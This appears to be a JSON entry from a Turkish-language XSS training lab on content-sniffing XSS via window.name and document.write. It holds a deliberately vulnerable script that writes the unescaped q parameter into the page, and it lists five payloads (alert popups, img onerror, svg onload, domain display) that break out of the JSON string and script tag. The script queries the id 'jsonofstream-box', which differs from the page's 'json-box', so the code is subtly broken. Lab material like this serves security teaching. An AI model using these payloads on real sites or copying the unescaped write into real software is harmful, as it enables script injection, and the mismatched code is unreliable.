{
  "title": "Content Sniffing XSS - window.name + document.write",
  "description": "JSON yanıtının MIME sniffing ile HTML olarak yorumlanmasını kullanarak window.name ve document.write ile XSS tetikleyin.",
  "objectives": [
    "JSON string'inden kaçın.",
    "window.name'e payload koyun.",
    "document.write ile XSS çalıştırın."
  ],
  "hints": [
    "String'i \\\" ile kapatın.",
    "} ve </script> kullanın.",
    "window.name = 'zararlı içerik'; document.write(window.name)"
  ],
  "difficulty": "medium",
  "category": "content-sniffing",
  "risk": "high",
  "status": "active",
  "body": "<div style='font-family: Arial; padding:20px;'><h2>Content Sniffing XSS - window.name + document.write</h2><p>window.name ve document.write kullanarak XSS yapın.</p><pre id='json-box' style='background:#222; padding:10px; color:#0f0; margin:20px 0;'></pre><div style='padding:20px; background:#222; border:1px solid #444; color:#eee;'><strong>Tüm Payload'lar (q parametresine ekleyin)</strong><ul style='margin:15px 0; line-height:2;'><li><strong>1. Büyük başlık (en garanti):</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='&lt;h1&gt;XSS via window.name + document.write&lt;/h1&gt;';document.write(window.name)&lt;/script&gt;</code></li><li><strong>2. Alert popup:</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='alert(\\\"XSS via window.name\\\")';document.write('&lt;script&gt;'+window.name+'&lt;\\/script&gt;')&lt;/script&gt;</code></li><li><strong>3. Img onerror ile:</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='&lt;img src=\\\"x\\\" onerror=\\\"alert(1)\\\">';document.write(window.name)&lt;/script&gt;</code></li><li><strong>4. Domain göster:</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='&lt;h2&gt;Domain: '+document.domain+'&lt;/h2&gt;';document.write(window.name)&lt;/script&gt;</code></li><li><strong>5. SVG onload ile:</strong><br><code style='background:#111; padding:8px; display:block;'>?q=\\&quot;}&lt;/script&gt;&lt;script&gt;window.name='&lt;svg onload=alert(\\\"XSS\\\")&gt;&lt;/svg&gt;';document.write(window.name)&lt;/script&gt;</code></li></ul><p><strong>Tavsiye:</strong> İlk payload en temiz şekilde çalışır.</p></div><script>const p=new URLSearchParams(location.search);const q=p.get('q')||'';const json=`{\"data\":\"${q}\"}`;document.getElementById('jsonofstream-box').textContent=json;document.write(json);</script></div>"
}